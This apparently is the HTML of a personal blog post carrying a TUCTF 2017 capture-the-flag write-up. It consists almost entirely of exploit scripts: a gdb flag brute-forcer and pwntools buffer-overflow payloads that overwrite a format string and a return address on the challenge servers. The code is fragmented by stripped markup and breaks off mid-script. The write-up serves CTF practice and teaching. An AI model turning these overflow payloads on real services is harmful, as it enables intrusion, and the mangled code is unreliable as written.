@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>TUCTF 2017 - Write up :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="gdb.execute(&amp;quot;b *0x0000000000401c82&amp;quot;)whileTrue:forcinchar_set:pattern=flag&#43;c&#43;&amp;quot;A&amp;quot;*(55-len(flag))gdb.execute(&amp;quot;r {}&amp;ldquo;.format(pattern))foriinrange(len(flag)):gdb.execute(&amp;quot;c&amp;quot;)rax=gdb.execute(&amp;quot;p/x $rax&amp;quot;,True,True).split()[-1]ifrax==&amp;quot;0x0&amp;quot;:flag&#43;=cif&amp;rdquo;}&amp;ldquo;inflag:print(&amp;quot;Flag : %s&amp;quot;%(flag))exit(0)print(&amp;quot;Curret Flag : %s&amp;quot;%(flag))sleep(1)breakprint(&amp;quot;Pattern : %s&amp;quot;%(pattern))print(&amp;quot;Nilai Rax : %s&amp;quot;%(rax))vuln=remote(&amp;quot;vulnchat.tuCTF.com&amp;quot;,4141)payload=&amp;quot;A&amp;quot;20&#43;p32(0x00007325)# overwrite with &amp;ldquo;%s&amp;quot;vuln.sendlineafter(&amp;quot;Enter your username: &amp;ldquo;,payload)payload2=&amp;quot;A&amp;quot;49&#43;p32(0x804856b)vuln.sendlineafter(&amp;rdquo;: &amp;ldquo;,payload2)printvuln.recvall()flag=&amp;quot;\x72&amp;quot;vuln2=remote(&amp;quot;vulnchat2.tuCTF.com&amp;quot;,4242)vuln2.sendlineafter(&amp;quot;Enter your username: &amp;ldquo;,&amp;quot;AAAA&amp;quot;)vuln2.recvuntil(&amp;quot;AAAA: &amp;ldquo;)payload=&amp;quot;A&amp;quot;*43&#43;flagvuln2.send(payload)printvuln2.recv(1024)never=remote(&amp;quot;neverending.tuCTF.com&amp;quot;,12345)char_set=&amp;quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !&amp;quot;#$%&amp;amp;&#39;()*&#43;,-./:;&amp;lt;=&amp;gt;?@[\]^_`{|}~&amp;lt;/span&amp;gt;s&amp;quot;defround1(char=&amp;quot;A&amp;quot;):never.sendlineafter(&amp;quot;text:&amp;ldquo;,char)enc_base=never.recvline().split(&amp;quot;is &amp;ldquo;)[1]enc_msg=never.recvline().split(&amp;quot;is &amp;ldquo;)[1]enc_msg=enc_msg.split(&amp;rdquo; decrypted?\n&amp;quot;)[0]log.info(&amp;quot;ENC BASE : -&amp;gt; {}&amp;ldquo;.format(enc_base))log.info(&amp;quot;ENC MSG : -&amp;gt; {}&amp;ldquo;.format(enc_msg))cal=ord(char)-ord(enc_base[0])dec=&amp;quot;&amp;ldquo;.join([chr(ord(b)&#43;cal)forbinenc_msg])&amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;non_printable&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;o&amp;quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;p&amp;quot;&amp;gt;[&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;nb&amp;quot;&amp;gt;chr&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;p&amp;quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;nb&amp;quot;&amp;gt;ord&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;p&amp;quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;z&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;p&amp;quot;&amp;gt;))&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;k&amp;quot;&amp;gt;for&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;z&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;ow&amp;quot;&amp;gt;in&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;dec&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;k&amp;quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;z&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;ow&amp;quot;&amp;gt;not&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;ow&amp;quot;&amp;gt;in&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;char_set&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;p&amp;quot;&amp;gt;]&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;n&amp;quot;&amp;gt;printable&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;o&amp;quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;s&amp;quot;&amp;gt;&amp;quot;&amp;quot;&amp;lt;/span&amp;gt;&amp;lt;span class=&amp;quot;o&amp;quot;&amp;gt;."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="rhamaa.github.io/post/2017-12-1-tuctf-2017/" />
+
+
+
+
+
+<link rel="stylesheet" href="rhamaa.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="rhamaa.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="rhamaa.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="rhamaa.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TUCTF 2017 - Write up"/>
+<meta name="twitter:description" content="gdb.execute(&quot;b *0x0000000000401c82&quot;)whileTrue:forcinchar_set:pattern=flag&#43;c&#43;&quot;A&quot;*(55-len(flag))gdb.execute(&quot;r {}&ldquo;.format(pattern))foriinrange(len(flag)):gdb.execute(&quot;c&quot;)rax=gdb.execute(&quot;p/x $rax&quot;,True,True).split()[-1]ifrax==&quot;0x0&quot;:flag&#43;=cif&rdquo;}&ldquo;inflag:print(&quot;Flag : %s&quot;%(flag))exit(0)print(&quot;Curret Flag : %s&quot;%(flag))sleep(1)breakprint(&quot;Pattern : %s&quot;%(pattern))print(&quot;Nilai Rax : %s&quot;%(rax))vuln=remote(&quot;vulnchat.tuCTF.com&quot;,4141)payload=&quot;A&quot;20&#43;p32(0x00007325)# overwrite with &ldquo;%s&quot;vuln.sendlineafter(&quot;Enter your username: &ldquo;,payload)payload2=&quot;A&quot;49&#43;p32(0x804856b)vuln.sendlineafter(&rdquo;: &ldquo;,payload2)printvuln.recvall()flag=&quot;\x72&quot;vuln2=remote(&quot;vulnchat2.tuCTF.com&quot;,4242)vuln2.sendlineafter(&quot;Enter your username: &ldquo;,&quot;AAAA&quot;)vuln2.recvuntil(&quot;AAAA: &ldquo;)payload=&quot;A&quot;*43&#43;flagvuln2.send(payload)printvuln2.recv(1024)never=remote(&quot;neverending.tuCTF.com&quot;,12345)char_set=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !&quot;#$%&amp;&#39;()*&#43;,-./:;&lt;=&gt;?@[\]^_`{|}~&lt;/span&gt;s&quot;defround1(char=&quot;A&quot;):never.sendlineafter(&quot;text:&ldquo;,char)enc_base=never.recvline().split(&quot;is &ldquo;)[1]enc_msg=never.recvline().split(&quot;is &ldquo;)[1]enc_msg=enc_msg.split(&rdquo; decrypted?\n&quot;)[0]log.info(&quot;ENC BASE : -&gt; {}&ldquo;.format(enc_base))log.info(&quot;ENC MSG : -&gt; {}&ldquo;.format(enc_msg))cal=ord(char)-ord(enc_base[0])dec=&quot;&ldquo;.join([chr(ord(b)&#43;cal)forbinenc_msg])&lt;span class=&quot;n&quot;&gt;non_printable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;."/>
+
+
+
+<meta property="og:title" content="TUCTF 2017 - Write up" />
+<meta property="og:description" content="gdb.execute(&quot;b *0x0000000000401c82&quot;)whileTrue:forcinchar_set:pattern=flag&#43;c&#43;&quot;A&quot;*(55-len(flag))gdb.execute(&quot;r {}&ldquo;.format(pattern))foriinrange(len(flag)):gdb.execute(&quot;c&quot;)rax=gdb.execute(&quot;p/x $rax&quot;,True,True).split()[-1]ifrax==&quot;0x0&quot;:flag&#43;=cif&rdquo;}&ldquo;inflag:print(&quot;Flag : %s&quot;%(flag))exit(0)print(&quot;Curret Flag : %s&quot;%(flag))sleep(1)breakprint(&quot;Pattern : %s&quot;%(pattern))print(&quot;Nilai Rax : %s&quot;%(rax))vuln=remote(&quot;vulnchat.tuCTF.com&quot;,4141)payload=&quot;A&quot;20&#43;p32(0x00007325)# overwrite with &ldquo;%s&quot;vuln.sendlineafter(&quot;Enter your username: &ldquo;,payload)payload2=&quot;A&quot;49&#43;p32(0x804856b)vuln.sendlineafter(&rdquo;: &ldquo;,payload2)printvuln.recvall()flag=&quot;\x72&quot;vuln2=remote(&quot;vulnchat2.tuCTF.com&quot;,4242)vuln2.sendlineafter(&quot;Enter your username: &ldquo;,&quot;AAAA&quot;)vuln2.recvuntil(&quot;AAAA: &ldquo;)payload=&quot;A&quot;*43&#43;flagvuln2.send(payload)printvuln2.recv(1024)never=remote(&quot;neverending.tuCTF.com&quot;,12345)char_set=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !&quot;#$%&amp;&#39;()*&#43;,-./:;&lt;=&gt;?@[\]^_`{|}~&lt;/span&gt;s&quot;defround1(char=&quot;A&quot;):never.sendlineafter(&quot;text:&ldquo;,char)enc_base=never.recvline().split(&quot;is &ldquo;)[1]enc_msg=never.recvline().split(&quot;is &ldquo;)[1]enc_msg=enc_msg.split(&rdquo; decrypted?\n&quot;)[0]log.info(&quot;ENC BASE : -&gt; {}&ldquo;.format(enc_base))log.info(&quot;ENC MSG : -&gt; {}&ldquo;.format(enc_msg))cal=ord(char)-ord(enc_base[0])dec=&quot;&ldquo;.join([chr(ord(b)&#43;cal)forbinenc_msg])&lt;span class=&quot;n&quot;&gt;non_printable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="rhamaa.github.io/post/2017-12-1-tuctf-2017/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="rhamaa.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="rhamaa.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="rhamaa.github.io/post/2017-12-1-tuctf-2017/">TUCTF 2017 - Write up</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by CTF.Ninja</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="rhamaa.github.io/tags/ctf/">CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/CTF.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->gdb<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->execute<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;b *0x0000000000401c82&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->while<!-- raw HTML omitted --> <!-- raw HTML omitted -->True<!-- raw HTML omitted --><!-- raw HTML omitted -->:<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->for<!-- raw HTML omitted --> <!-- raw HTML omitted -->c<!-- raw HTML omitted --> <!-- raw HTML omitted -->in<!-- raw HTML omitted --> <!-- raw HTML omitted -->char_set<!-- raw HTML omitted --><!-- raw HTML omitted -->:<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->pattern<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->flag<!-- raw HTML omitted --> <!-- raw HTML omitted -->+<!-- raw HTML omitted --> <!-- raw HTML omitted -->c<!-- raw HTML omitted --> <!-- raw HTML omitted -->+<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;A&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted -->*<!-- raw HTML omitted --> <!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->55<!-- raw HTML omitted --><!-- raw HTML omitted -->-<!-- raw HTML omitted --><!-- raw HTML omitted -->len<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->flag<!-- raw HTML omitted --><!-- raw HTML omitted -->))<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->gdb<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->execute<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;r {}&ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->format<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->pattern<!-- raw HTML omitted --><!-- raw HTML omitted -->))<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->for<!-- raw HTML omitted --> <!-- raw HTML omitted -->i<!-- raw HTML omitted --> <!-- raw HTML omitted -->in<!-- raw HTML omitted --> <!-- raw HTML omitted -->range<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->len<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->flag<!-- raw HTML omitted --><!-- raw HTML omitted -->)):<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->gdb<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->execute<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;c&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->rax<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->gdb<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->execute<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;p/x $rax&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->,<!-- raw HTML omitted --><!-- raw HTML omitted -->True<!-- raw HTML omitted --><!-- raw HTML omitted -->,<!-- raw HTML omitted --><!-- raw HTML omitted -->True<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->split<!-- raw HTML omitted --><!-- raw HTML omitted -->()[<!-- raw HTML omitted --><!-- raw HTML omitted -->-<!-- raw HTML omitted --><!-- raw HTML omitted -->1<!-- raw HTML omitted --><!-- raw HTML omitted -->]<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> <!-- raw HTML omitted -->rax<!-- raw HTML omitted --> <!-- raw HTML omitted -->==<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;0x0&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->:<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->flag<!-- raw HTML omitted --> <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> <!-- raw HTML omitted -->c<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> <!-- raw HTML omitted -->&rdquo;}&ldquo;<!-- raw HTML omitted --> <!-- raw HTML omitted -->in<!-- raw HTML omitted --> <!-- raw HTML omitted -->flag<!-- raw HTML omitted --><!-- raw HTML omitted -->:<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;Flag : <!-- raw HTML omitted --><!-- raw HTML omitted -->%<!-- raw HTML omitted --><!-- raw HTML omitted -->s&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted -->%<!-- raw HTML omitted --> <!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->flag<!-- raw HTML omitted --><!-- raw HTML omitted -->))<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->exit<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->0<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;Curret Flag : <!-- raw HTML omitted --><!-- raw HTML omitted -->%<!-- raw HTML omitted --><!-- raw HTML omitted -->s&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted -->%<!-- raw HTML omitted --> <!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->flag<!-- raw HTML omitted --><!-- raw HTML omitted -->))<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->sleep<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->1<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->break<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;Pattern : <!-- raw HTML omitted --><!-- raw HTML omitted -->%<!-- raw HTML omitted --><!-- raw HTML omitted -->s&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted -->%<!-- raw HTML omitted --> <!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->pattern<!-- raw HTML omitted --><!-- raw HTML omitted -->))<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;Nilai Rax : <!-- raw HTML omitted --><!-- raw HTML omitted -->%<!-- raw HTML omitted --><!-- raw HTML omitted -->s&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted -->%<!-- raw HTML omitted --> <!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->rax<!-- raw HTML omitted --><!-- raw HTML omitted -->))<!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->vuln<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->remote<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;vulnchat.tuCTF.com&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->,<!-- raw HTML omitted --><!-- raw HTML omitted -->4141<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->payload<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;A&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted --><em><!-- raw HTML omitted --> <!-- raw HTML omitted -->20<!-- raw HTML omitted --> <!-- raw HTML omitted -->+<!-- raw HTML omitted --> <!-- raw HTML omitted -->p32<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->0x00007325<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --> <!-- raw HTML omitted --># overwrite with &ldquo;%s&quot;<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->vuln<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->sendlineafter<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;Enter your username: &ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->,<!-- raw HTML omitted --><!-- raw HTML omitted -->payload<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->payload2<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;A&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted --></em><!-- raw HTML omitted --> <!-- raw HTML omitted -->49<!-- raw HTML omitted --> <!-- raw HTML omitted -->+<!-- raw HTML omitted --> <!-- raw HTML omitted -->p32<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->0x804856b<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->vuln<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->sendlineafter<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&rdquo;: &ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->,<!-- raw HTML omitted --><!-- raw HTML omitted -->payload2<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->vuln<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->recvall<!-- raw HTML omitted --><!-- raw HTML omitted -->()<!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->flag<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->\x72<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->vuln2<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->remote<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;vulnchat2.tuCTF.com&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->,<!-- raw HTML omitted --> <!-- raw HTML omitted -->4242<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->vuln2<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->sendlineafter<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;Enter your username: &ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->,<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;AAAA&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->vuln2<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->recvuntil<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;AAAA: &ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->payload<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;A&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted -->*<!-- raw HTML omitted --> <!-- raw HTML omitted -->43<!-- raw HTML omitted --> <!-- raw HTML omitted -->+<!-- raw HTML omitted --> <!-- raw HTML omitted -->flag<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->vuln2<!-- raw HTML omitted --><!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->send<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->payload<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted -->
